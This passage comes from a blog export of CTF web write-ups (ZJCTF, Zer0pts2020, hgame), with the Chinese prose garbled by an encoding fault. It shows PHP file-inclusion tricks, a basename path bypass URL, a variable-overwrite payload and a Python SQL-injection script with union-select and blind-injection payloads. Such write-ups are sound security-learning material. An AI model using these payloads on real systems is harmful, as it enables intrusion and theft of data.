=&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>axios.get/post</p>
<p>axios.get().theml().catch()</p>
<p>åœ¨thenå’Œcatå½“ä¸­å»å†™åˆ«çš„ä¸œè¥¿ï¼Œä¸Šå›¾å½“ä¸­çš„res.dataä¸ºAPIç»™å›æ¥çš„æ•°æ®ï¼ŒæˆåŠŸä¹‹årouter.pushå°±å¯ä»¥è®©é¡µé¢è¿›è¡Œè·³è½¬äº†</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ„Ÿè§‰è‡ªå·±æ˜¯è¾¹å­¦è¾¹å†™çš„ï¼Œå­¦åˆ°åé¢çš„æ—¶å€™æ„Ÿè§‰ä¹‹å‰çš„ä¸œè¥¿è¿˜å¯ä»¥åšå¾—æ›´å¥½ï¼Œä½†æ˜¯è“ç‹—äº†ï¼Œå·²ç»ä¸æƒ³åŠ¨äº†orz</p>
]]></content>
      <tags>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>ZJCTF,å°±è¿™ï¼Ÿ</title>
    <url>/2020/11/20/ZJCTF-%E5%B0%B1%E8%BF%99%EF%BC%9F/</url>
    <content><![CDATA[<p>ç»å…¸çš„ä»£ç å®¡è®¡ï¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ³¨æ„ç¬¬ä¸€æ­¥ï¼Œéœ€è¦æˆ‘ä»¬è¯»å–åˆ°çš„æ–‡ä»¶çš„å†…å®¹å½“ä¸­å«æœ‰I have a dreamï¼Œç„¶è€Œæ–‡ä»¶å½“ä¸­å‹æ ¹æ²¡æœ‰è¿™ä¸ªå†…å®¹ï¼Œäºæ˜¯è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæœ‰ä¸¤ä¸ªåŠæ³•ï¼Œç¬¬ä¸€ä¸ªæ˜¯åˆ©ç”¨php://input,data://ä¼ªåè®®</p>
<p>å¦‚æœä½ ä½¿ç”¨php://input,é‚£ä¹ˆphpå°±ä¼šå»è¯»å–bodyå½“ä¸­çš„å†…å®¹ï¼Œä½ åªéœ€è¦åœ¨è¿™æ„é€ I have a dreamå³å¯ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰çš„å°±æ˜¯åˆ©ç”¨data://ä¼ªåè®®ï¼Œ</p>
<p>è¿˜æœ‰è¿œç¨‹æ–‡ä»¶åŒ…å«</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020</title>
    <url>/2020/11/24/Zer0pts2020/</url>
    <content><![CDATA[<h1 id="Can-you-guess-it"><a href="#Can-you-guess-it" class="headerlink" title="Can you guess it?"></a>Can you guess it?</h1><p>ä¸€å¼€å§‹æ”¾æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>è™½ç„¶è¿™é‡Œçš„çŒœæµ‹æˆåŠŸä¹‹åä½ å¯ä»¥æ‹¿åˆ°flagï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™é‡Œçš„å‡½æ•°å¹¶æ²¡æœ‰æ¼æ´ï¼Œç”¨çš„å‡½æ•°æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé‚£ä¹ˆå°±è½¬æ¢æ€è·¯çœ‹ä¸Šé¢çš„ highlight_fileï¼Œå› ä¸ºè¿™é‡Œçš„å‚æ•°æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œä»‹ç»ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>è¯¥å‚æ•°ä¼šè¿”å›æˆ‘ä»¬çš„URLçš„è·¯å¾„ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="image-20201124124501905.png" alt="image-20201124124501905"></p>
<p>æˆ‘ä»¬å†ç”¨basenameå¥—ä¸Šå»</p>
<p><img src="image-20201124124659976.png" alt="image-20201124124659976"></p>
<p>è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°æœ€åä¸€éƒ¨åˆ†äº†ï¼Œä½†æ˜¯basenameæœ‰ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p><img src="image-20201124124821264.png" alt="image-20201124124821264"></p>
<p>å®˜ç½‘æ˜¯æœ‰æç¤ºçš„ï¼Œæˆ‘ä»¬éœ€è¦å•ç‹¬çš„setloaleæ¥è¿›è¡Œæ“ä½œï¼Œå› ä¸ºasciiä¸­æœ‰è¿™ä¹ˆä¸€æ®µä»‹ç»ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">åœ¨è‹±è¯­ä¸­ï¼Œç”¨128ä¸ªç¬¦å·ç¼–ç ä¾¿å¯ä»¥è¡¨ç¤ºæ‰€æœ‰ï¼Œä½†æ˜¯ç”¨æ¥è¡¨ç¤ºå…¶ä»–è¯­è¨€ï¼Œ128ä¸ªç¬¦å·æ˜¯ä¸å¤Ÿçš„ã€‚æ¯”å¦‚ï¼Œåœ¨æ³•è¯­ä¸­ï¼Œå­—æ¯ä¸Šæ–¹æœ‰æ³¨éŸ³ç¬¦å·ï¼Œå®ƒå°±æ— æ³•ç”¨ ASCII ç è¡¨ç¤ºã€‚äºæ˜¯ï¼Œä¸€äº›æ¬§æ´²å›½å®¶å°±å†³å®šï¼Œåˆ©ç”¨å­—èŠ‚ä¸­é—²ç½®çš„æœ€é«˜ä½ç¼–å…¥æ–°çš„ç¬¦å·ã€‚æ¯”å¦‚ï¼Œæ³•è¯­ä¸­çš„Ã©çš„ç¼–ç ä¸º130ï¼ˆäºŒè¿›åˆ¶10000010ï¼‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œè¿™äº›æ¬§æ´²å›½å®¶ä½¿ç”¨çš„ç¼–ç ä½“ç³»ï¼Œå¯ä»¥è¡¨ç¤ºæœ€å¤š256ä¸ªç¬¦å· [5]  ã€‚</span><br><span class="line">ä½†æ˜¯ï¼Œè¿™é‡Œåˆå‡ºç°äº†æ–°çš„é—®é¢˜ã€‚ä¸åŒçš„å›½å®¶æœ‰ä¸åŒçš„å­—æ¯ï¼Œå› æ­¤ï¼Œå“ªæ€•å®ƒä»¬éƒ½ä½¿ç”¨256ä¸ªç¬¦å·çš„ç¼–ç æ–¹å¼ï¼Œä»£è¡¨çš„å­—æ¯å´ä¸ä¸€æ ·ã€‚æ¯”å¦‚ï¼Œ130åœ¨æ³•è¯­ç¼–ç ä¸­ä»£è¡¨äº†Ã©ï¼Œåœ¨å¸Œä¼¯æ¥è¯­ç¼–ç ä¸­å´ä»£è¡¨äº†å­—æ¯Gimel (×’)ï¼Œåœ¨ä¿„è¯­ç¼–ç ä¸­åˆä¼šä»£è¡¨å¦ä¸€ä¸ªç¬¦å·ã€‚ä½†æ˜¯ä¸ç®¡æ€æ ·ï¼Œæ‰€æœ‰è¿™äº›ç¼–ç æ–¹å¼ä¸­ï¼Œ0--127è¡¨ç¤ºçš„ç¬¦å·æ˜¯ä¸€æ ·çš„ï¼Œä¸ä¸€æ ·çš„åªæ˜¯128--255çš„è¿™ä¸€æ®µ [5]  ã€‚</span><br><span class="line">è‡³äºäºšæ´²å›½å®¶çš„æ–‡å­—ï¼Œä½¿ç”¨çš„ç¬¦å·å°±æ›´å¤šäº†ï¼Œæ±‰å­—å°±å¤šè¾¾10ä¸‡å·¦å³ã€‚ä¸€ä¸ªå­—èŠ‚åªèƒ½è¡¨ç¤º256ç§ç¬¦å·ï¼Œè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œå°±å¿…é¡»ä½¿ç”¨å¤šä¸ªå­—èŠ‚è¡¨è¾¾ä¸€ä¸ªç¬¦å·ã€‚æ¯”å¦‚ï¼Œç®€ä½“ä¸­æ–‡å¸¸è§çš„ç¼–ç æ–¹å¼æ˜¯ GB2312ï¼Œä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œæ‰€ä»¥ç†è®ºä¸Šæœ€å¤šå¯ä»¥è¡¨ç¤º 256 x 256 = 65536 ä¸ªç¬¦å· [5]  ã€‚</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦æˆ‘ä»¬çš„asciiä½æ•°å¤§äº128ï¼Œå°±ä¼šå‡ºç°æ­§ä¹‰çš„æƒ…å†µï¼Œè€Œæ±‰å­—é»˜è®¤ä½¿ç”¨çš„æ˜¯GBKç¼–ç ï¼Œå¦‚æœæˆ‘ä»¬è¾“å‡ºçš„æ•°å¤§äº128ï¼Œbasenameå› ä¸ºæ— æ³•æ­£ç¡®çš„è§£æï¼Œå°±ä¼šå¿½ç•¥è¿™ ä¸€æ®µï¼Œå‘å‰æŸ¥æ‰¾ã€‚</p>
<p><img src="image-20201124125211434.png" alt="image-20201124125211434"></p>
<p>é‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ¸…æ¥šäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3a053ba1-1ae6-4030-8c67-3cacb6336ad7.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;%81?source</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="image-20201124125355533.png" alt="image-20201124125355533"></p>
<h1 id="phpNantokaAdmin"><a href="#phpNantokaAdmin" class="headerlink" title="phpNantokaAdmin"></a>phpNantokaAdmin</h1><h1 id="MusicBlog"><a href="#MusicBlog" class="headerlink" title="MusicBlog"></a>MusicBlog</h1><p>è¿™é‡Œä¸»è¦æ˜¯ç”¨åˆ°äº†ä¸€ä¸ªtrickï¼Œå…³äºHTMLçš„ä¸€ä¸ªç»†èŠ‚ã€‚å½“HTMLå‡ºç°&lt;a/xxx&gt;çš„æƒ…å†µä¸‹ï¼Œåˆ™ä¼šé»˜è®¤åªè§£æå‰åŠéƒ¨åˆ†ï¼Œè€Œä¸ä¼šè§£æåé¢çš„partï¼Œå…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">title</span>&gt;</span>åŸºç¡€æŸ±çŠ¶å›¾<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> &gt;</span> 123123123123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">a</span>/<span class="attr">bcde</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†åœ¨è§£æç§ï¼Œä¾ç„¶ä¼šå°†åè€…è§£æå˜æˆaæ ‡ç­¾ã€‚</p>
<p>å›åˆ°é¢˜ç›®æ¥è¯´ï¼Œåªéœ€è¦æˆ‘ä»¬é€šè¿‡è¯¥ç‰¹è´¨+hrefå³å¯å®Œæˆè·¨åŸŸç»•è¿‡</p>
<p>è¯¦ç»†æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;guokeya.github.io&#x2F;post&#x2F;rFsNvBC3x&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;78814</span><br></pre></td></tr></table></figure>



<p><img src="Zer0pts2020/image-20201202150825012.png" alt="image-20201202150825012"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame</title>
    <url>/2021/02/24/hgame/</url>
    <content><![CDATA[<p>Hgame</p>
<p>é¢˜ç›®å‡ºå¾—éƒ½æŒºå¥½çš„..</p>
<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h2><p>å„ç§æŠ“åŒ…å°±å¥½äº†</p>
<h2 id="ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆ"><a href="#ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆ" class="headerlink" title="ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆ"></a>ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆ</h2><p>JSé‡Œé¢å¯ä»¥æ‰¾åˆ°ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥é€šè¿‡æ”¹åˆ†è¾¨ç‡çœŸçš„ç©æ¸¸æˆ</p>
<h2 id="å®è—èµ°ç§è€…"><a href="#å®è—èµ°ç§è€…" class="headerlink" title="å®è—èµ°ç§è€…"></a>å®è—èµ°ç§è€…</h2><p>HTTPèµ°ç§ï¼Œå·²ç»å†™è¿‡äº†</p>
<h2 id="æ™ºå•†æ£€æµ‹é¸¡"><a href="#æ™ºå•†æ£€æµ‹é¸¡" class="headerlink" title="æ™ºå•†æ£€æµ‹é¸¡"></a>æ™ºå•†æ£€æµ‹é¸¡</h2><p>ä¸€ä¸ªè„šæœ¬é¢˜ç›®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> requests.cookies <span class="keyword">import</span> RequestsCookieJar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># import json</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¾—åˆ°é—®é¢˜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getQuestion</span>(<span class="params">content</span>):</span></span><br><span class="line">    </span><br><span class="line">    soup=BeautifulSoup(content,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">	<span class="comment">#print soup.prettify()</span></span><br><span class="line">    a=soup.find_all(<span class="string">&#x27;mo&#x27;</span>)</span><br><span class="line">    b=soup.find_all(<span class="string">&#x27;mi&#x27;</span>)</span><br><span class="line">    c=soup.find_all(<span class="string">&#x27;mn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sx=a[<span class="number">1</span>].string+c[<span class="number">0</span>].string</span><br><span class="line">    xx=c[<span class="number">1</span>].string</span><br><span class="line">    sc=c[<span class="number">2</span>].string+<span class="string">&quot;*&quot;</span>+b[<span class="number">0</span>].string+a[<span class="number">3</span>].string+c[<span class="number">3</span>].string</span><br><span class="line">    print(<span class="string">&quot;sc=&#123;&#125;,sx=&#123;&#125;,xx=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(sc,sx,xx))</span><br><span class="line">    <span class="comment"># print(sx+&quot;:&quot;+xx+&quot;:&quot;+sc)</span></span><br><span class="line">    x=symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    answer=<span class="built_in">float</span>(integrate(sc,(<span class="string">&#x27;x&#x27;</span>,sx,xx)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print(answer)</span></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line"><span class="comment"># &#123;&quot;answer&quot;:-42927&#125;</span></span><br><span class="line"><span class="comment"># &#123;&quot;answer&quot;:&quot;-42927&quot;&#125;</span></span><br><span class="line"><span class="comment"># å›ç­”é—®é¢˜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">answer,cookies</span>):</span></span><br><span class="line">    verify = <span class="string">&quot;http://r4u.top:5000/api/verify&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cookies)&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer)&#125;</span><br><span class="line">    res2 = requests.post(verify, data=json.dumps(data),headers=headers)</span><br><span class="line">    </span><br><span class="line">    cookies = res2.cookies[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(integrate(18 * x + 18, (&#x27;x&#x27;, -68, 83)))</span></span><br><span class="line"><span class="comment"># å…ˆè¿›è¡Œé¡¶ä¸€æ¬¡è®¿é—®æ‹¿åˆ°cookies</span></span><br><span class="line">cookies = verify(<span class="number">1</span>,<span class="string">&quot;sss&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    <span class="comment"># print(answer)</span></span><br><span class="line">    Question = <span class="string">&quot;http://r4u.top:5000/api/getQuestion&quot;</span></span><br><span class="line">    print(cookies)</span><br><span class="line">    header = &#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cookies)&#125;</span><br><span class="line">    res = requests.get(Question,headers=header)</span><br><span class="line">    content = res.text</span><br><span class="line">    <span class="comment"># å¾—åˆ°ç­”æ¡ˆ</span></span><br><span class="line">    answer = getQuestion(content)</span><br><span class="line"></span><br><span class="line">    verify = <span class="string">&quot;http://r4u.top:5000/api/verify&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cookies)&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer)&#125;</span><br><span class="line">    res2 = requests.post(verify, data=json.dumps(data),headers=headers)</span><br><span class="line">    print(res2.text)</span><br><span class="line">    </span><br><span class="line">    cookies = res2.cookies[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">    print(cookies)</span><br><span class="line">    print(answer)</span><br></pre></td></tr></table></figure>



<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="æ‡’ç‹—R4u"><a href="#æ‡’ç‹—R4u" class="headerlink" title="æ‡’ç‹—R4u"></a>æ‡’ç‹—R4u</h2><p>å¯ä»¥æ‹¿ä¸‹æºç <a href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$filter = [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›´æ¥æ³¨å†Œæ‰€æœ‰å˜é‡ï¼Œè¿™æ ·æˆ‘å°±èƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_k =&gt; $_v)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($filter <span class="keyword">as</span> $youBadBad)&#123;</span><br><span class="line">            $_k = str_replace($youBadBad, <span class="string">&#x27;&#x27;</span>, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; = $_v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆç»å…¸çš„å˜é‡è¦†ç›–äº†ï¼Œè¿‡æ»¤åªä¸è¿‡æ˜¯å˜ç©ºï¼Œè¿™æ ·å­æ„é€ Payload ?_SSSSESIONESION[username]=admin</p>
<p>å³å¯</p>
<h2 id="200OKï¼"><a href="#200OKï¼" class="headerlink" title="200OKï¼"></a>200OKï¼</h2><p>ä¸€é“ç®€å•çš„æ³¨å…¥é¢˜ç›®ï¼Œåšçš„æ—¶å€™æƒ³å¤æ‚äº†ï¼Œåæ¥æ‰æ„è¯†åˆ°é‚£ä¹ˆç®€å•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://200ok.liki.link/server.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/database() #&quot;&#125;</span></span><br><span class="line">headers =&#123;<span class="string">&quot;Status&quot;</span>:<span class="string">&quot;-1&#x27;/**/Union/**/Select/**/group_concat(table_name)/**/From(information_schema.tables)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;</span>&#125;</span><br><span class="line">headers =&#123;<span class="string">&quot;Status&quot;</span>:<span class="string">&quot;-1&#x27;/**/Union/**/Select/**/group_concat(column_name)/**/From(information_schema.columns)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;</span>&#125;</span><br><span class="line">headers =&#123;<span class="string">&quot;Status&quot;</span>:<span class="string">&quot;-1&#x27;/**/Union/**/Select/**/ffffff14gggggg/**/From/**/f1111111144444444444g #&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, headers=headers).text</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = &quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1, 999):</span></span><br><span class="line"><span class="comment">#     # for j in stringlist:</span></span><br><span class="line"><span class="comment">#     for j in range(40, 126):</span></span><br><span class="line"><span class="comment">#         # sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         # sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         # sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(</span></span><br><span class="line"><span class="comment">#         #     i, j)</span></span><br><span class="line"><span class="comment">#         sql = &quot;1&#x27;||if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)  #&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         sql = &quot;1&#x27;||if(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)  #&quot;.format(i,j)</span></span><br><span class="line"><span class="comment">#         headers = &#123;&quot;Status&quot;: sql&#125;</span></span><br><span class="line"><span class="comment">#         res = requests.get(url=url, headers=headers)</span></span><br><span class="line"><span class="comment">#         # print(data)</span></span><br><span class="line"><span class="comment">#         if &quot;NETWORK ERROR&quot; in res.text:</span></span><br><span class="line"><span class="comment">#             print(j)</span></span><br><span class="line"><span class="comment">#             flag += chr(j)</span></span><br><span class="line"><span class="comment">#             print(flag)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     if i == 30:</span></span><br><span class="line"><span class="comment">#         sys.exit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># database: week2sql</span></span><br></pre></td></tr></table></figure>



